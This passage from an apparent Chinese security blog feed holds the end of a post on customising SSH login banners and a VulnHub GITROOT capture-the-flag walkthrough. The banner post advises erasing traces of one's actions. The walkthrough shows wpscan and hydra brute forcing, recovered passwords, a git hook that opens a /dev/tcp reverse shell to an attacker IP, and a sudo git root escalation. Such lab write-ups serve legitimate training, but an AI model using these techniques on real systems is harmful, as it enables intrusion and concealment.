&lt;p&gt;上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用&lt;br&gt;
来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制&lt;br&gt;
 sed -i ‘s/#Banner none/Banner/etc/issue.net/g’ /etc/ssh/sshd_config;systemctl restart&lt;br&gt;
sshd; echo -e ‘\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗&lt;br&gt;
██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝&lt;br&gt;
╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║&lt;br&gt;
██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝’ &amp;gt; /etc/issue.net&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1236.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆&lt;br&gt;
前显示的，/etc/issue.net 的作用就是登陆前显示信息&lt;/p&gt;
&lt;p&gt;将登陆后的信息也显示一下进行对比就更容易理解&lt;br&gt;
执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1237.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后&lt;/p&gt;
&lt;h3 id=&#34;一键关闭登陆前的信息展示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一键关闭登陆前的信息展示&#34;&gt;#&lt;/a&gt; 一键关闭登陆前的信息展示&lt;/h3&gt;
&lt;p&gt;sed -i ‘s/Banner /etc/issue.net/#Banner none/g’ /etc/ssh/sshd_config;systemctl&lt;br&gt;
restart sshd;echo &amp;gt; /etc/issue.net&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1238.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;除了上述几种方式外我们还可以添加自定义的语句到环境变量中登陆到&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#除了上述几种方式外我们还可以添加自定义的语句到环境变量中登陆到&#34;&gt;#&lt;/a&gt; 除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到&lt;/h3&gt;
&lt;p&gt;shell 后就会执行，比如在环境变量里边添加&lt;br&gt;
 figlet 表示以一种方式去打印后面跟的字母或者数字&lt;br&gt;
 cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;br&gt;
figlet I’m X_T&lt;br&gt;
EOF&lt;br&gt;
 检查这个文件是否完整的写入到了环境变量里边&lt;br&gt;
 cat ~/.bashrc | tail -n1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1239.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;vim ~/.bashrcs 删除此条信息则不会在显示这条&lt;/p&gt;
&lt;h3 id=&#34;如果显示的信息太多了影响视觉有没有办法一键全部删除掉答案是肯定&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如果显示的信息太多了影响视觉有没有办法一键全部删除掉答案是肯定&#34;&gt;#&lt;/a&gt; 如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定&lt;/h3&gt;
&lt;p&gt;的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都&lt;br&gt;
再不会被显示出来&lt;br&gt;
 for USER in  &lt;code&gt;cat /etc/passwd | grep /bin/bash |grep -v root | cut -d &amp;quot;:&amp;quot; -f 1&lt;/code&gt;  ;do touch&lt;br&gt;
/home/$USER/.hushlogin;done;touch /root/.hushlogin&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1240.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;一键删除阻碍登陆日志信息输出的文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一键删除阻碍登陆日志信息输出的文件&#34;&gt;#&lt;/a&gt; 一键删除阻碍登陆日志信息输出的文件：&lt;/h3&gt;
&lt;p&gt;for USER in  &lt;code&gt;cat /etc/passwd | grep /bin/bash |grep -v root | cut -d &amp;quot;:&amp;quot; -f 1&lt;/code&gt;  ;do rm -f&lt;br&gt;
/home/$USER/.hushlogin;done;rm -f /root/.hushlogin&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1241.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复&lt;br&gt;
原，并且删除自己操作过的痕迹，防止被知道自己操作过什么&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/148%20GITROOT/</guid>
            <title>VULNHUB 48 GITROOT</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/148%20GITROOT/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ2l0cm9vdC0xLDQ4OC8=&#34;&gt;https://www.vulnhub.com/entry/gitroot-1,488/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2dpdHJvb3Qt&#34;&gt;https://www.hackingarticles.in/gitroot-&lt;/span&gt; 1 - vulnhub-walkthrough/&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oMGozbi5tZWRpdW0uY29tL3Z1bG5odWItZ2l0cm9vdC0=&#34;&gt;https://h0j3n.medium.com/vulnhub-gitroot-&lt;/span&gt; 1 - d1ea5de3d10a&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 GITROOT：桥接于 1 92.168. 0 .1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;br&gt;
 靶机开启之前和开启之后各扫一次，可以直接得到靶机 ip 192.168.0.187&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1470.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;#&lt;/a&gt; 对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1471.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 http：可对 web 进行渗透测试收集信息&lt;br&gt;
 11211 memcache：未知端口&lt;/p&gt;
&lt;h3 id=&#34;002-网站突破-子域寻找-多字典目录测试-git泄漏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-网站突破-子域寻找-多字典目录测试-git泄漏&#34;&gt;#&lt;/a&gt; 002 网站突破、子域寻找、多字典目录测试、git 泄漏&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODcv&#34;&gt;http://192.168.0.187/&lt;/span&gt; 进行 http 信息收集&lt;/p&gt;
&lt;h3 id=&#34;提示我们有一个域名需要检查一下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提示我们有一个域名需要检查一下&#34;&gt;#&lt;/a&gt; 提示我们有一个域名需要检查一下&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1472.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;将这个子域名以及它的上一级域名的dns解析地址进行修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#将这个子域名以及它的上一级域名的dns解析地址进行修改&#34;&gt;#&lt;/a&gt; 将这个子域名以及它的上一级域名的 DNS 解析地址进行修改&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1473.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;再次查看子域名，发现是一个 wordpress 站点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1474.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;而域名处还是原来的界面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#而域名处还是原来的界面&#34;&gt;#&lt;/a&gt; 而域名处还是原来的界面&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1475.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;对 wordpress 站点进行扫描扫描，获取其存在的用户名&lt;br&gt;
 wpscan -e u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dwLmdpdHJvb3QudnVsbi8=&#34;&gt;http://wp.gitroot.vuln/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1476.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到一个用户名 beth&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1477.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;顺便爆破一下这个用户名的密码但是没有结果&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#顺便爆破一下这个用户名的密码但是没有结果&#34;&gt;#&lt;/a&gt; 顺便爆破一下这个用户名的密码，但是没有结果&lt;/h3&gt;
&lt;p&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U beth -P&lt;br&gt;
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dwLmdpdHJvb3QudnVsbi8=&#34;&gt;http://wp.gitroot.vuln/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1478.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;进行目录扫描看看有没有敏感的站点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进行目录扫描看看有没有敏感的站点&#34;&gt;#&lt;/a&gt; 进行目录扫描，看看有没有敏感的站点&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-&lt;br&gt;
2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dwLmdpdHJvb3QudnVsbi8=&#34;&gt;http://wp.gitroot.vuln/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1479.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;都点开看了一下发现没有什么敏感的文件，既然这个站下有 wp.gitroot.vuln&lt;br&gt;
 这个子域名，会不会有其他的子域名，尝试一波扫描子域名&lt;br&gt;
 gobuster vhost - w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-&lt;br&gt;
top100000.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dwLmdpdHJvb3QudnVsbi8=&#34;&gt;http://wp.gitroot.vuln/&lt;/span&gt; - o subdomain.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1480.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫描到了子域名 repo.gitroot.vuln&lt;/p&gt;
&lt;p&gt;将其添加到本地 hosts 文件中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1481.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==&#34;&gt;http://repo.gitroot.vuln/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1482.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提示有 set.php 页面和 get.php 页面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1483.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;按提示设置个 key 和 value 的值看看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1484.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是好像没有什么用，get.php 文件显示不出来有价值的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1485.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;下一步就扫扫目录看有没有什么新发现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下一步就扫扫目录看有没有什么新发现&#34;&gt;#&lt;/a&gt; 下一步就扫扫目录，看有没有什么新发现&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-&lt;br&gt;
2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==&#34;&gt;http://repo.gitroot.vuln/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1486.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;所有的目录都打开看了看发现没有什么有价值的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#所有的目录都打开看了看发现没有什么有价值的信息&#34;&gt;#&lt;/a&gt; 所有的目录都打开看了看，发现没有什么有价值的信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1487.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;换个字典在扫一波，这次用 common.txt 这个字典&lt;br&gt;
 gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==&#34;&gt;http://repo.gitroot.vuln/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1488.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;多得到了一个文件，为 http://repo.gitroot.vuln/.git/HEAD&lt;br&gt;
 访问之后显示没有权限去查看，但是确定文件是真实存在的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1489.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;并且可以访问得到这个文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#并且可以访问得到这个文件&#34;&gt;#&lt;/a&gt; 并且可以访问得到这个文件&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1490.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-git-dumper使用git-切换仓库git信息利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-git-dumper使用git-切换仓库git信息利用&#34;&gt;#&lt;/a&gt; 003 git-dumper 使用，git 切换仓库，git 信息利用&lt;/h3&gt;
&lt;p&gt;对于 /.git/HEAD 文件泄漏，可以使用 git-dumper 工具，在 github 上下载&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1494.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;python3 git_dumper.py &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==&#34;&gt;http://repo.gitroot.vuln/&lt;/span&gt; ./repo_gitroot&lt;br&gt;
 用此工具将源码给下载到本地的 repo_gitroot 文件夹中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1491.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;看了看这几个文件有一个文件显示了几个疑似用户名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#看了看这几个文件有一个文件显示了几个疑似用户名&#34;&gt;#&lt;/a&gt; 看了看这几个文件，有一个文件显示了几个疑似用户名&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1492.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;有一个文件提示说去看看其他的 git 仓库&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1493.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;一个一个的 git show，在一个仓库中找到了如下的代码&lt;br&gt;
 git show ce3843e497dd28f992250d36ee1b4e8c9e0f18e9&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1495.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;或者用 git reset --hard 来切换 git 的仓库信息&lt;br&gt;
 git reset --hard b069fdde4cf12980175c3fbd79316fe42b57e19a&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1496.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了一组用户和密码 pablo：ihjedpvqfe&lt;/p&gt;
&lt;h3 id=&#34;但是这个用户和密码是来不到这台服务器的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#但是这个用户和密码是来不到这台服务器的&#34;&gt;#&lt;/a&gt; 但是这个用户和密码是来不到这台服务器的&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1497.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;看来只有自己设置用户名字典来爆破了先尝试自己输入一些在收集信息过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#看来只有自己设置用户名字典来爆破了先尝试自己输入一些在收集信息过程&#34;&gt;#&lt;/a&gt; 看来只有自己设置用户名字典来爆破了，先尝试自己输入一些在收集信息过程&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1498.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;中看到的疑似密码的字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#中看到的疑似密码的字典&#34;&gt;#&lt;/a&gt; 中看到的疑似密码的字典&lt;/h3&gt;
&lt;p&gt;用自定义的密码爆破没有结果，就用 rockyou.txt 字典来爆破&lt;br&gt;
 hydra -L user.txt -P passwd.txt ssh://192.168.0.187 -f -t 64 -I -vV&lt;br&gt;
hydra -L user.txt -P rockyou.txt ssh://192.168.0.187 -f -t 64 -I -vV&lt;br&gt;
 需要爆破很长时间才能爆破出来，目前还没有找到更快的爆破的方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1499.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1500.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;第一次登陆点击确认连接，之后就可以用 sshpass 来登陆&lt;br&gt;
 sshpass -p mastergitar ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnBhYmxvQDE5Mi4xNjguMC4xODc=&#34;&gt;pablo@192.168.0.187&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1501.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-7-z使用git定时备份提权viminfo信息泄漏git提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-7-z使用git定时备份提权viminfo信息泄漏git提权&#34;&gt;#&lt;/a&gt; 004 7 z 使用，git 定时备份提权，.viminfo 信息泄漏，git 提权&lt;/h3&gt;
&lt;p&gt;之前在 git 不同的版本上找过过一个密码，看一看服务器有哪些用户，试试之前&lt;br&gt;
哪个密码是不是这几个用户的密码，依次尝试 jen beth root，发现 ihjedpvqfe&lt;br&gt;
 不是个密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1502.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用户文件下提示需要检查一个新的 git 仓库&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1503.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然有新的 git 仓库，肯定有个.git 文件，直接 find 全局搜索&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1504.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;进到这个文件夹下，依次使用 git show 查看不同的本地仓库的改变&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1505.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;没有什么新发现在看看这个文件夹下有没有什么敏感文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没有什么新发现在看看这个文件夹下有没有什么敏感文件&#34;&gt;#&lt;/a&gt; 没有什么新发现，在看看这个文件夹下有没有什么敏感文件&lt;/h3&gt;
&lt;h3 id=&#34;居然发现了一个非常器官的文件有这么多前缀相同的肯定有什么问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#居然发现了一个非常器官的文件有这么多前缀相同的肯定有什么问题&#34;&gt;#&lt;/a&gt; 居然发现了一个非常器官的文件，有这么多前缀相同的，肯定有什么问题&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1506.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;排序查看有什么情况 ls -Alh | sort -k4 | tail -n5&lt;br&gt;
 看到 dev- 43 与众不同，查看其内容之后有一些 git 的提交信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1507.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查看到第三条日志中是增加了一些信息，用 git show 查看一下增加的信息&lt;br&gt;
 git show 06fbefc1da56b8d552cfa299924097ba1213dd93&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1508.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了一个密码，用这个密码成功拿到了 beth 用户的权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1509.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;在用户目录下看到了一个提示文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在用户目录下看到了一个提示文件&#34;&gt;#&lt;/a&gt; 在用户目录下看到了一个提示文件&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1510.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;只需要将 zip 文件放在～jen/public/repos/ 下，就会将它自动解压到 jen 仓&lt;br&gt;
库，看来是 jen 用户的一个定期执行任务的脚本&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1511.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;测试了一下，服务器上没有 unzip 命令，但是有 7 z 命令，构造下列 Linux 命令&lt;br&gt;
 cd /tmp;git init;echo -e ‘#!/bin/bash \nbash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444&lt;br&gt;
0&amp;gt;&amp;amp;1’ &amp;gt; /tmp/.git/hooks/post-commit;chmod 777 /tmp/.git/hooks/post-commit;7z a&lt;br&gt;
/tmp/shell.zip /tmp/.git;cp /tmp/shell.zip /home/jen/public/repos/&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1512.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这个复合的 linux 命令的作用就是将反弹 shell 的脚本打印到一个新的 git 仓&lt;br&gt;
库的 hooks/post-commit 中，并且赋予可执行权限，在用 7 z 进行压缩为 zip，&lt;br&gt;
最后在将其复制到 jen 用户下的 repos 中&lt;/p&gt;
&lt;p&gt;监听 shell 等待 jen 用户的 shell 反弹出来，接收到之后标准化 tty&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1513.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;到处看一看文件都翻阅一下看看有敏感信息没有&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#到处看一看文件都翻阅一下看看有敏感信息没有&#34;&gt;#&lt;/a&gt; 到处看一看文件，都翻阅一下看看有敏感信息没有&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1514.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现 viminfo 中有一个 binzpbeocnexoe，可能是个密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1515.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;su root 尝试了一下，是失败的，它不是 root 的密码，继续试一下，发现它就&lt;br&gt;
是用户 jen 的密码，这样子就可以用来看 jen 的权限设置，看是否有什么问&lt;br&gt;
题，找到了 jen 用户可以直接调用 root 的 git 命令执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1516.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 gtfobins 上找到了提权方法&lt;br&gt;
 sudo git help config&lt;br&gt;
!/bin/bash&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1517.png&#34; alt&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-&amp;gt; 成功拿到了 root 的 shell&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/147%20WARZONE3/</guid>
            <title>VULNHUB 47 WARZONE3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/147%20WARZONE3/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0=&#34;&gt;https://www.vulnhub.com/entry/warzone-&lt;/span&gt; 3 - exogen,606/&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kNGtLaV9najR2aw==&#34;&gt;https://www.youtube.com/watch?v=d4kKi_gj4vk&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 WARZONE 3 ：桥接于 1 92.168. 0 .1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;br&gt;
 开靶机扫了一次，开靶机后扫了一次，得到靶机 ip 192.168.0.186&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1432.png&#34; alt&gt;&lt;/p&gt;
